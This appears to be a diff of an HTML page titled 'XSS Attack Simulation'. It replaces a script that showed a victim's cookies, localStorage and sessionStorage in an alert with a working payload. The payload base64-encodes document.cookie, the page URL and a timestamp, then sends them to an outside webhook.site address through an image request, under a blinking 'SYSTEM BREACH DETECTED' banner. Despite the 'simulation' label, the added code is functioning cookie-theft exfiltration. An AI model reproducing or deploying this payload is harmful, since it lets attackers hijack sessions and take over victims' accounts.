@@ -1,22 +1,45 @@
-<script>
-  // تجهيز البيانات الحساسة
-  const info = `
-🍪 Cookies:
-${document.cookie || "None"}
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>💀 XSS Attack Simulation 💀</title>
+    <style>
+      body {
+        background-color: black;
+        color: red;
+        font-family: monospace;
+        text-align: center;
+        padding-top: 10%;
+      }
+      #alert-box {
+        font-size: 24px;
+        animation: blink 1s infinite;
+      }
+      @keyframes blink {
+        0% { opacity: 1; }
+        50% { opacity: 0.3; }
+        100% { opacity: 1; }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="alert-box">💀 SYSTEM BREACH DETECTED 💀</div>
 
-📦 LocalStorage:
-${JSON.stringify(localStorage, null, 2) || "None"}
+    <script>
+      const beep = new Audio("https://freesound.org/data/previews/331/331912_3248244-lq.mp3");
+      beep.play().catch(() => {});
 
-📦 SessionStorage:
-${JSON.stringify(sessionStorage, null, 2) || "None"}
-
-🌍 URL:
-${location.href}
-
-⏰ Time:
-${new Date().toISOString()}
+      const payload = `
+Cookies: ${document.cookie}
+URL: ${location.href}
+Time: ${new Date().toISOString()}
 `;
 
-  // تشغيل التنبيه
-  alert("💀 XSS Triggered by S7if 💀\n\n" + info);
-</script>
+      const encoded = btoa(unescape(encodeURIComponent(payload)));
+
+      const img = new Image();
+      img.src = "https://webhook.site/9587c7b9-459a-447f-8fe9-6f16c5fc41ca?data=" + encoded;
+
+      document.body.appendChild(img);
+    </script>
+  </body>
+</html>
